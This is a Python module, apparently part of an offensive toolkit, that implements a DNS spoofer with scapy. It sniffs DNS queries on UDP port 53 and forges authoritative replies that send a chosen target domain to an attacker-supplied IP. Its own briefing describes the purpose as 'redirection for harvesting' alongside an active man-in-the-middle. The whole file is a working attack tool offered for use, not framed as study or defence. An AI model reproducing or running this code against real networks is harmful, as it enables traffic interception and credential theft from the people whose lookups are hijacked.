# --- Module Context: DNS Spoofer v2.1 ---
# Purpose: High-speed DNS redirection.
# Rules: Must be paired with active MITM to intercept target UDP/53 traffic.
# ----------------------------------------
from scapy.all import IP, UDP, DNS, DNSRR, DNSQR, send, sniff
from rich.console import Console
from core.ui import show_briefing

console = Console()
SPOOF_MAP = {}


def dns_spoofer_callback(packet):
    if packet.haslayer(DNSQR):  # Question Record
        queried_domain = packet[DNSQR].qname.decode().strip('.')
        if queried_domain in SPOOF_MAP:
            # Crafting forged response
            spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                    an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=SPOOF_MAP[queried_domain]))
            send(spoofed_pkt, verbose=False, count=1)
            console.print(
                f"[bold red][!] REDIRECTED:[/bold red] {queried_domain} -> {SPOOF_MAP[queried_domain]}")


def start_dns_spoof():
    show_briefing("DNS Spoofer", "Dynamic redirection for harvesting.", [
                  "Active MITM required"])
    domain = console.input("[bold cyan]Target Domain: [/bold cyan]").strip()
    redirect_ip = console.input(
        "[bold cyan]Redirect IP (Davoid Hub): [/bold cyan]").strip()
    if domain and redirect_ip:
        SPOOF_MAP[domain] = redirect_ip
    try:
        sniff(filter="udp port 53", prn=dns_spoofer_callback, store=0)
    except KeyboardInterrupt:
        pass
